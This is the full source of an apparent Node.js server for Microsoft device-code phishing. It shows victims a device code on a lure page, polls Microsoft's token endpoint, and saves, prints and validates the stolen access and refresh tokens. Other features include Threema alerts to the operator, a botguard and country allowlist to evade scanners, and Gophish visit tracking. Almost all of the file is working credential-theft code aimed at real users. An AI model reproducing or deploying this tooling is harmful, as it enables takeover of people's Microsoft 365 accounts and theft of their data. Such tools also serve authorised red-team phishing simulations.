import express from 'express';
import template from 'ejs';
import cookies from 'cookie-parser';
import fs from 'fs';
import https from 'https';
import http from 'http';
import path from 'path';
import { fileURLToPath } from 'url';
import geoip from 'geoip-country';
import { publicUrl, COMMON_ENDPOINTS } from './smoke-test.mjs';
import { checkBotguard, getChallengeHtml, initBotguard } from './botguard.mjs';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const configPath = path.join(__dirname, 'config.json');

const defaultConfig = {
    httpPort: 80,
    httpsPort: 443,
    testMode: true,
    debug: true,
    clientId: "d3590ed6-52b3-4102-aeff-aad2292ab01c", // MS public client ID
    tokenUrl: "https://login.microsoftonline.com/Common/oauth2/v2.0/token",
    deviceCodeUrl: "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",
    scopes: "offline_access openid",
    phishingHTML: "index.html",
    redirectUrl: "https://www.microsoft.com",
    alreadyLoggedInURL: "https://onedrive.live.com/",
    cookieExpirationInDays: 90,
    userCodesFile: "successful_user_code_cookies.txt",
    logFile: "logfile.txt",
    tokenFile: "tokens.txt",
    visitLogFile: "visits.tsv",
    threemaOn: false,
    threemaTo: ["YourID1","YourID2"],
    threemaFrom: "YourName",
    threemaURL: "https://msgapi.threema.ch/send_simple",
    threemaSecret: "PutYourSecretHere",
    keyFilePath: "/var/lib/tokenphisher/certs/example.com/privkey.pem",
    certFilePath: "/var/lib/tokenphisher/certs/example.com/cert.pem",
    caFilePath: "/var/lib/tokenphisher/certs/example.com/origin-ca.pem",
    userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    geoipallowlist: ["US","CA"],
    validateTokens: true,
    printTokensOnCapture: true,
    graphValidationScope: "https://graph.microsoft.com/.default offline_access",
    botguard: {
        enabled: true,
        jsChallenge: false,
        safelinksBlock: true,
        blockedJa3: [],
    },
};

const fileConfig = fs.existsSync(configPath)
    ? JSON.parse(fs.readFileSync(configPath, 'utf8'))
    : {};
const config = {
    ...defaultConfig,
    ...fileConfig,
    botguard: { ...defaultConfig.botguard, ...fileConfig.botguard },
};

initBotguard(config);

function resolveCertPath(certPath) {
    return path.isAbsolute(certPath) ? certPath : path.join(__dirname, certPath);
}

function victimUrl() {
    return publicUrl(config, '/share', __dirname);
}

function smokeTestUrl() {
    return publicUrl(config, '/smoke-test', __dirname);
}

const activeVisits = new Map();

function visitLogPath() {
    return config.visitLogFile || 'visits.tsv';
}

function clientIp(req) {
    return (
        req.headers['cf-connecting-ip'] ||
        req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
        req.ip ||
        req.connection?.remoteAddress ||
        ''
    );
}

function recipientEmailFromQuery(req) {
    return String(req.query.r || req.query.email || '').trim().slice(0, 256);
}

function gophishRidFromQuery(req) {
    return String(req.query.rid || '').trim().slice(0, 256);
}

function visitTrackingFromQuery(req) {
    const email = recipientEmailFromQuery(req);
    const gophishRid = gophishRidFromQuery(req);
    const fallbackId = String(req.query.id || '').trim().slice(0, 256);
    return {
        recipient: email || fallbackId || gophishRid,
        gophishRid,
    };
}

function appendVisitRow({ code, recipient = '', gophishRid = '', ip = '', status, user = '', detail = '' }) {
    const safeDetail = String(detail).replace(/[\t\r\n]+/g, ' ').slice(0, 500);
    const row = [
        getTime().trim(),
        code,
        recipient,
        gophishRid,
        ip,
        status,
        user,
        safeDetail,
    ].join('\t') + '\n';
    writeToFile(visitLogPath(), row);
}

function registerVisit(code, { recipient, gophishRid, ip, route }) {
    activeVisits.set(code, { recipient, gophishRid, ip, route });
    appendVisitRow({ code, recipient, gophishRid, ip, status: 'issued' });
    logMessage(
        `Visit ${route} — code ${code}` +
        (recipient ? ` recipient=${recipient}` : '') +
        (gophishRid ? ` rid=${gophishRid}` : '') +
        (ip ? ` ip=${ip}` : '')
    );
}

function finalizeVisit(code, status, user = '', detail = '') {
    const visit = activeVisits.get(code) || {};
    appendVisitRow({
        code,
        recipient: visit.recipient || '',
        gophishRid: visit.gophishRid || '',
        ip: visit.ip || '',
        status,
        user,
        detail,
    });
    activeVisits.delete(code);
}

function displayCodeToVictim(res, userCode) {
    const date = new Date();
    date.setDate(date.getDate() + config.cookieExpirationInDays);
    res.cookie('shareCode', userCode, {
        secure: true,
        httpOnly: true,
        expires: date,
    });

    res.render(config.phishingHTML, {
        user_code: userCode
    });
}

function getTime() {
    const currentDate = new Date();
    const day = currentDate.getDate().toString().padStart(2, '0');
    const month = (currentDate.getMonth() + 1).toString().padStart(2, '0');
    const year = currentDate.getFullYear().toString();
    const hours = currentDate.getHours().toString().padStart(2, '0');
    const minutes = currentDate.getMinutes().toString().padStart(2, '0');
    const seconds = currentDate.getSeconds().toString().padStart(2, '0');

    const formattedDateTime = `[${day}.${month}.${year}|${hours}:${minutes}:${seconds}]\t`;

    return `${formattedDateTime}`;
}

function pollForAzureTokens(deviceCode, userCode, oauthConfig = config) {
    logMessage('Start polling token for code: ' + userCode);
    let runCount = 1;
    const interval = setInterval(() => {
        (async () => {
            try {
                if (runCount % 30 === 0 && runCount > 0 && config.debug === false) {
                    logMessage('No worries, I am still polling token for code: ' + userCode);
                }
                const pollResult = await fetchAzureToken(deviceCode, oauthConfig);
                logMessage('Still polling token for code: ' + userCode, 'debug');
                logMessage('Did return error property in JSON? -> ' + (pollResult.hasOwnProperty('error') ? true : false), 'debug');
                logMessage('Did return success property in JSON? -> ' + (pollResult.hasOwnProperty('access_token') ? true : false), 'debug');
                logMessage('HTTP response was:\n' + JSON.stringify(pollResult, null, 4), 'debug');
                if (pollResult.error && pollResult.error !== 'authorization_pending') {
                    if (pollResult.error === 'expired_token') {
                        logMessage(`The following user code expired: ${userCode}. No longer poll it.`, 'error');
                        finalizeVisit(userCode, 'expired', '', 'device code timed out before login');
                        clearInterval(interval);
                    } else {
                        logMessage(`Another error occured than expiring for code:\n${formatAzureToken(userCode, pollResult)}`, 'error');
                        finalizeVisit(
                            userCode,
                            'login_failed',
                            '',
                            pollResult.error_description || pollResult.error || 'oauth error'
                        );
                        clearInterval(interval);
                    }
                }
                if (pollResult.access_token) {
                    const resolved = await resolveCaptureIdentity(pollResult);
                    finalizeVisit(userCode, 'captured', resolved.identity.upn);
                    logMessage(`Success, your Azure tokens for code ${userCode} were saved to ${config.tokenFile}`);
                    writeToFile(config.userCodesFile, userCode + '\n');
                    writeToFile(config.tokenFile, getTime() + formatAzureToken('Usercode: ' + userCode, pollResult));
                    writeToFile(userCode, JSON.stringify(pollResult, null, 4));
                    logCaptureTokens(userCode, pollResult);
                    if (config.validateTokens !== false) {
                        await validateCapturedTokens(userCode, pollResult, oauthConfig, resolved);
                    }
                    sendThreemaNotifications();
                    clearInterval(interval);
                }
                runCount++;
            }
            catch (error) {
                logMessage(error.stack, 'error');
            }
        })();
    }, 2000);
}

function logMessage(message, type) {
    if (!config.debug && type === "debug") {
        return;
    }
    if (type === "error") {
        console.error(getTime() + message);
    } else if (type === "debug") {
        message = '***DEBUG*** ' + message
        console.log(getTime() + message);
    } else {
        console.log(getTime() + message);
    }
    writeToFile(config.logFile, getTime() + message + '\n');
}

function formatAzureToken(userCode, pollResult) {
    return userCode + '\n' + JSON.stringify(pollResult, null, 4) + '\n\n';
}

function logCaptureTokens(userCode, pollResult) {
    if (config.printTokensOnCapture === false) {
        return;
    }
    logMessage(`ACCESS TOKEN (${userCode}):\n${pollResult.access_token}`);
    if (pollResult.refresh_token) {
        logMessage(`REFRESH TOKEN (${userCode}):\n${pollResult.refresh_token}`);
    }
    if (pollResult.id_token) {
        logMessage(`ID TOKEN (${userCode}):\n${pollResult.id_token}`);
    }
}

function sendThreemaNotifications() {
    if (config.threemaOn) {
        config.threemaTo.forEach(function (threemaID) {
            sendThreemaNotification(threemaID);
        });
    }
}

function writeToFile(path, content) {
    fs.writeFile(path, content, {
        flag: 'a+'
    }, error => {
        if (error) {
            throw error
        }
    });
}

function userHasValidCookie(path, str) {
    if (fs.existsSync(path)) {
        const contents = fs.readFileSync(path, 'utf-8');
        return contents.includes(str);
    }
    return false;
}

function buildPostRequest(body, oauthConfig = config) {
    return {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": oauthConfig.userAgent
        },
        body,
    };
}

async function sendThreemaNotification(recipient) {
    const data = new URLSearchParams({
        'from': config.threemaFrom,
        'to': recipient,
        'secret': config.threemaSecret,
        'text': 'Great success you have a new access token.'
    });
    await fetch(config.threemaURL, buildPostRequest(data));
    logMessage('Sent Threema notification to ' + recipient)
}

async function fetchAzureToken(deviceCode, oauthConfig = config) {
    const data = new URLSearchParams({
        'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
        'client_id': oauthConfig.clientId,
        'code': deviceCode
    });
    const response = await fetch(oauthConfig.tokenUrl, buildPostRequest(data, oauthConfig));
    return await response.json();
}

function decodeJwtPayload(jwt) {
    try {
        const parts = String(jwt).split('.');
        if (parts.length < 2) {
            return null;
        }
        let payload = parts[1].replace(/-/g, '+').replace(/_/g, '/');
        while (payload.length % 4) {
            payload += '=';
        }
        return JSON.parse(Buffer.from(payload, 'base64').toString('utf8'));
    } catch {
        return null;
    }
}

function upnFromClaims(claims) {
    return (
        claims.preferred_username ||
        claims.upn ||
        claims.unique_name ||
        claims.email ||
        claims.login ||
        claims.username ||
        ''
    );
}

function identityFromTokens(pollResult) {
    const idClaims = pollResult.id_token ? decodeJwtPayload(pollResult.id_token) : null;
    const accessClaims =
        pollResult.access_token && pollResult.access_token.includes('.')
            ? decodeJwtPayload(pollResult.access_token)
            : null;
    const claims = idClaims || accessClaims;

    if (!claims) {
        return { upn: 'unknown', tenantId: 'unknown', displayName: '' };
    }

    const upn = upnFromClaims(idClaims) || upnFromClaims(accessClaims) || 'unknown';
    const tenantId = idClaims?.tid || accessClaims?.tid || 'unknown';
    const displayName = idClaims?.name || accessClaims?.name || '';

    return { upn, tenantId, displayName };
}

async function resolveCaptureIdentity(pollResult) {
    const identity = identityFromTokens(pollResult);
    if (identity.upn !== 'unknown') {
        return { identity, graphResult: null };
    }

    const graphResult = await testGraphMe(pollResult.access_token);
    if (graphResult.status !== 200) {
        return { identity, graphResult: null };
    }

    const profile = graphResult.body;
    return {
        identity: {
            upn: profile.userPrincipalName || profile.mail || identity.upn,
            tenantId: identity.tenantId,
            displayName: profile.displayName || identity.displayName,
        },
        graphResult,
    };
}

function summarizeApiError(body) {
    if (body?.error?.message) {
        return body.error.message;
    }
    if (body?.error_description) {
        return body.error_description;
    }
    if (body?.error) {
        return `${body.error}${body.suberror ? ` (${body.suberror})` : ''}`;
    }
    return JSON.stringify(body).slice(0, 240);
}

function describeGraphFailure(status, body) {
    const detail = summarizeApiError(body);
    if (status === 429) {
        return `GRAPH RATE LIMITED — HTTP 429: ${detail}. Microsoft throttles Graph for the public Office client ID; capture still succeeded.`;
    }
    if (status === 401 || status === 403) {
        return `GRAPH DENIED — HTTP ${status}: ${detail}`;
    }
    return `GRAPH CHECK FAILED — HTTP ${status}: ${detail}`;
}

function describeRefreshFailure(body) {
    const detail = summarizeApiError(body);
    if (detail.includes('AADSTS53003')) {
        return (
            `REFRESH DENIED — ${detail.split('. Trace ID')[0]}. ` +
            'Often Microsoft blocking Graph scope refresh on the public Office client — not necessarily your tenant Conditional Access. Capture still succeeded.'
        );
    }
    if (detail.includes('AADSTS65001') || /consent/i.test(detail)) {
        return `REFRESH DENIED — admin consent required: ${detail}`;
    }
    return `REFRESH DENIED — ${detail}`;
}

async function testGraphMe(accessToken) {
    const response = await fetch('https://graph.microsoft.com/v1.0/me', {
        headers: {
            Authorization: `Bearer ${accessToken}`,
            'User-Agent': config.userAgent,
        },
    });
    let body = {};
    try {
        body = await response.json();
    } catch {
        body = {};
    }
    return { status: response.status, body };
}

async function refreshAccessToken(refreshToken, scopes, oauthConfig = config) {
    const data = new URLSearchParams({
        grant_type: 'refresh_token',
        client_id: oauthConfig.clientId,
        refresh_token: refreshToken,
        scope: scopes,
    });
    const response = await fetch(oauthConfig.tokenUrl, buildPostRequest(data, oauthConfig));
    let body = {};
    try {
        body = await response.json();
    } catch {
        body = {};
    }
    return { status: response.status, body };
}

async function validateCapturedTokens(userCode, pollResult, oauthConfig = config, preResolved = null) {
    const { identity, graphResult: cachedGraph } = preResolved || (await resolveCaptureIdentity(pollResult));
    const { upn, tenantId, displayName } = identity;

    logMessage(
        `CAPTURE OK — user=${upn} tenant=${tenantId} code=${userCode}` +
        (displayName ? ` name="${displayName}"` : '')
    );

    const graphScope = config.graphValidationScope || 'https://graph.microsoft.com/.default offline_access';

    let graphResult = cachedGraph || (await testGraphMe(pollResult.access_token));
    if (graphResult.status === 200) {
        const profile = graphResult.body;
        logMessage(
            `GRAPH OK — ${profile.displayName || profile.userPrincipalName} (${profile.userPrincipalName})`
        );
        return;
    }

    logMessage(describeGraphFailure(graphResult.status, graphResult.body));

    if (!pollResult.refresh_token) {
        logMessage('REFRESH SKIP — no refresh_token in response');
        return;
    }

    logMessage('Trying refresh_token exchange for Graph scope ...', 'debug');
    const refreshResult = await refreshAccessToken(pollResult.refresh_token, graphScope, oauthConfig);

    if (refreshResult.body.error) {
        logMessage(describeRefreshFailure(refreshResult.body));
        return;
    }

    if (!refreshResult.body.access_token) {
        logMessage('REFRESH FAILED — no access_token in refresh response', 'error');
        return;
    }

    writeToFile(`${userCode}.graph-refresh.json`, JSON.stringify(refreshResult.body, null, 4) + '\n');

    graphResult = await testGraphMe(refreshResult.body.access_token);
    if (graphResult.status === 200) {
        const profile = graphResult.body;
        logMessage(
            `REFRESH OK + GRAPH OK — ${profile.displayName || profile.userPrincipalName} (${profile.userPrincipalName})`
        );
        logMessage(`Refreshed Graph token saved to ${userCode}.graph-refresh.json`);
        return;
    }

    logMessage(describeGraphFailure(graphResult.status, graphResult.body) + ' (refreshed token issued)');
}

async function fetchDeviceCode(oauthConfig = config) {
    const data = new URLSearchParams({
        'client_id': oauthConfig.clientId,
        'scope': oauthConfig.scopes,
        'claims': '{"access_token": {"amr": {"values": ["ngcmfa", "mfa"]}}}',
    });
    const response = await fetch(oauthConfig.deviceCodeUrl, buildPostRequest(data, oauthConfig));
    if (response.status !== 200) {
        throw new Error(`Fetch failed with status: ${response.status} for URL ${oauthConfig.deviceCodeUrl} ${await response.text()}`);
    }
    return response.json();
}

function isCountryIP(ip) {
    if (!ip) {
        return false;
    }
    const geo = geoip.lookup(ip);
    if (!geo) {
        return false;
    }
    if (config.geoipallowlist.includes(geo.country)) {
        return true;
    }
    logMessage(`Access from country denied: Country: ${geo.country}, IP: ${ip}`);
    return false;
}

function handleBotguard(req, res) {
    const ip = clientIp(req);
    const result = checkBotguard(req, ip, config);
    if (result.action === 'allow') {
        return true;
    }
    logMessage(`Botguard ${result.action}: ${result.reason} ip=${ip}`);
    if (result.action === 'challenge') {
        res.status(200).send(getChallengeHtml(req, ip, config));
        return false;
    }
    res.redirect(config.redirectUrl);
    return false;
}

const app = express();
app.set('trust proxy', true);
app.engine('html', template.renderFile);
app.use(express.static('public'));
app.use(cookies());
writeToFile(config.logFile, getTime() + '-------\n');
logMessage('Debug mode is on', 'debug');

// redirect to defined site if only base / is accessed
app.get('/', function (req, res) {
    res.redirect(config.redirectUrl);
});

app.get('/share', async (req, res, next) => {
    try {
        const ip = clientIp(req);
        if (!isCountryIP(ip) && !config.testMode) {
            return res.redirect(config.redirectUrl);
        }
        if (!handleBotguard(req, res)) {
            return;
        }
        if (userHasValidCookie(config.userCodesFile, req.cookies.shareCode)) {
            res.redirect(config.alreadyLoggedInURL);
            return next();
        }
        const deviceCodeResponse = await fetchDeviceCode();
        let userCode = deviceCodeResponse.user_code;
        let deviceCode = deviceCodeResponse.device_code;
        const tracking = visitTrackingFromQuery(req);
        registerVisit(userCode, {
            recipient: tracking.recipient,
            gophishRid: tracking.gophishRid,
            ip: clientIp(req),
            route: '/share',
        });
        displayCodeToVictim(res, userCode);
        pollForAzureTokens(deviceCode, userCode);
    }
    catch (error) {
        logMessage(error.stack, 'error');
    }
});

app.get('/smoke-test', async (req, res) => {
    try {
        const smokeConfig = { ...config, ...COMMON_ENDPOINTS };
        const deviceCodeResponse = await fetchDeviceCode(smokeConfig);
        const userCode = deviceCodeResponse.user_code;
        const deviceCode = deviceCodeResponse.device_code;
        const tracking = visitTrackingFromQuery(req);
        registerVisit(userCode, {
            recipient: tracking.recipient || 'smoke-test',
            gophishRid: tracking.gophishRid,
            ip: clientIp(req),
            route: '/smoke-test',
        });
        displayCodeToVictim(res, userCode);
        pollForAzureTokens(deviceCode, userCode, smokeConfig);
    } catch (error) {
        logMessage(error.stack, 'error');
        res.status(500).send(`Smoke test failed: ${error.message}`);
    }
});

if (config.testMode) {
    http.createServer(app).listen(config.httpPort, () => {
        logMessage('App listening on port ' + config.httpPort);
        logMessage('Victim URL: ' + victimUrl());
        logMessage('Smoke test URL: ' + smokeTestUrl() + ' (/common/ — your account)');
    });
} else {
    const tlsOptions = {
        key: fs.readFileSync(resolveCertPath(config.keyFilePath)),
        cert: fs.readFileSync(resolveCertPath(config.certFilePath)),
    };
    const caPath = resolveCertPath(config.caFilePath);
    if (config.caFilePath && fs.existsSync(caPath)) {
        tlsOptions.ca = fs.readFileSync(caPath);
    }
    https.createServer(tlsOptions, app).listen(config.httpsPort, () => {
        logMessage('App listening on port ' + config.httpsPort);
        logMessage('Victim URL: ' + victimUrl());
        logMessage('Smoke test URL: ' + smokeTestUrl() + ' (/common/ — your account)');
    });
}
